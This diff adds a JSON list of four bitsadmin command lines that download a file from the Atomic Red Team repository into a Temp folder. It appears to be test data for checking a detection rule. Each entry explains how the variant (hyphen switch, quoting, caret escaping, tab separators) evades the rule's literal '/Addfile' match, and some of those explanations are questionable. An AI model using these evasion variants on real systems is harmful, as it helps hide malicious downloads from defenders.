@@ -1,0 +1,18 @@
+[
+  {
+    "output": "bitsadmin.exe -addfile AtomicBITS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md C:\\Users\\thaim\\AppData\\Local\\Temp\\bitsadmin3_flag.ps1",
+    "explanation": "Substitution technique: Built-in Windows utilities like bitsadmin accept parameter switches prefixing with a hyphen ('-') interchangeably with a forward slash ('/'). Substituting '/Addfile' with '-addfile' breaks the literal token constraint in 'selection_cli_add_1' while remaining functionally identical."
+  },
+  {
+    "output": "bitsadmin.exe \"/Addfile\" AtomicBITS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md C:\\Users\\thaim\\AppData\\Local\\Temp\\bitsadmin3_flag.ps1",
+    "explanation": "Insertion technique: Wrapping the mandatory switch keyword inside double quotes ('\"/Addfile\"') interrupts the literal substring validation logic. The Windows API unquotes the argument string dynamically during runtime mapping, rendering the rule's exact string check in 'selection_cli_add_1' ineffective."
+  },
+  {
+    "output": "cmd.exe /c bitsadmin.exe /Ad^dfile AtomicBITS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md C:\\Users\\thaim\\AppData\\Local\\Temp\\bitsadmin3_flag.ps1",
+    "explanation": "Insertion technique: Spawning the execution through cmd.exe permits the insertion of a shell escape caret character ('^') directly into the command structure. The active shell command-line interpreter strips this modifier token before passing arguments to bitsadmin, logging '/Ad^dfile' and defeating 'selection_cli_add_1'."
+  },
+  {
+    "output": "bitsadmin.exe\t/Addfile\tAtomicBITS\thttps://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md\tC:\\Users\\thaim\\AppData\\Local\\Temp\\bitsadmin3_flag.ps1",
+    "explanation": "Substitution technique: Replaces space character delineators throughout the parameters with horizontal tab characters ('\\t'). The native Windows operating system evaluates tabs as perfectly valid whitespace argument separators, which can safely bypass basic rule collections requiring static single-space normalization."
+  }
+]
